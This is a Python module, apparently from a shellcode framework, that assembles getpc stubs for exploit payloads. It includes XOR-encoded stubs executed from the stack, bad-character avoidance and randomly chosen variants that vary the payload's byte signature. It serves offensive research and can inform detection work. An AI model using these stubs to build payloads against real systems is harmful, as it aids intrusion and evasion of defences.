#!/usr/bin/python

"""
Collection of getpc stubs
"""

from random import choice
from struct import unpack, pack
from assembler.assembler import assembler
from arch.core import stackpointer_registers, word_keywords, bit_packs, arch_registers
from utils.bytework import align_bytes

class getpc_stub_builder:
	def __init__(self, arch, bits, badchars = ""):
		self.arch = arch
		self.bits = bits
		self.badchars = badchars
		return

	# Basic, straight-forward getpc stub
	def basic_getpc_stub(self, getpc_reg):
		variables = {'getpc_reg': getpc_reg}

		# EB 05 is jmp over call since MIASM won't correctly assemble this otherwise
		# TODO: make short jump to remove nullbytes
		listing = '''
	main:
		JMP do_getpc_call
	getpc_callback:
		POP {getpc_reg}
		.byte 0xEB
		.byte 0x05
	do_getpc_call:
		CALL getpc_callback
	'''

		asm = assembler(self.arch, self.bits)
		stub = asm.assemble(listing.format(**variables))
		return stub

	# Generates encoded getpc stub and executes it from stack
	def encoded_stack_getpc_stub(self, getpc_reg, key_reg, key):
		stackpointer_reg = stackpointer_registers[self.bits]
		word_keyword = word_keywords[self.bits]

		regs = arch_registers(self.arch, self.bits)
		reg1 = regs.random_gp_reg(False, [key_reg])

		plain_stub = self.stack_getpc_stub(getpc_reg)
		encoded_stub = unpack(bit_packs[self.bits], plain_stub)[0] ^ unpack(bit_packs[self.bits], key)[0]

		variables = {'reg1': reg1, 'key_reg': key_reg, 'stackpointer_reg': stackpointer_reg, 'encoded_stub': encoded_stub, 'word_keyword': word_keyword}

		listings = ['''
	main:
		MOV {reg1}, {encoded_stub}
		XOR {reg1}, {key_reg}
		PUSH {reg1}
		CALL {stackpointer_reg}
	''',

	'''
	main:
		PUSH {encoded_stub}
		XOR {word_keyword} PTR [{stackpointer_reg}], {key_reg}
		CALL {stackpointer_reg}
	''']

		listing = choice(listings)
		
		asm = assembler(self.arch, self.bits)
		stub = asm.assemble(listing.format(**variables))
		return stub

	# Generates word-sized stack-based getpc stub
	def stack_getpc_stub(self, getpc_reg):

		stackpointer_reg = stackpointer_registers[self.bits]
		word_keyword = word_keywords[self.bits]
		word_size = self.bits / 8

		variables = {'getpc_reg': getpc_reg, 'word_keyword': word_keyword, 'stackpointer_reg': stackpointer_reg}
		  
		listings = ['''
	main:
		POP {getpc_reg}
		JMP {getpc_reg}		
	''',

	'''
	main:
		POP {getpc_reg}
		PUSH {getpc_reg}
		RET
	''',

	'''
	main:
		MOV {getpc_reg}, {word_keyword} PTR [{stackpointer_reg}]
		RET
	''']

		listing = choice(listings)
		
		asm = assembler(self.arch, self.bits)
		stub = asm.assemble(listing.format(**variables))

		# Align to word-size for stack pushing

		return align_bytes(stub, word_size, self.badchars)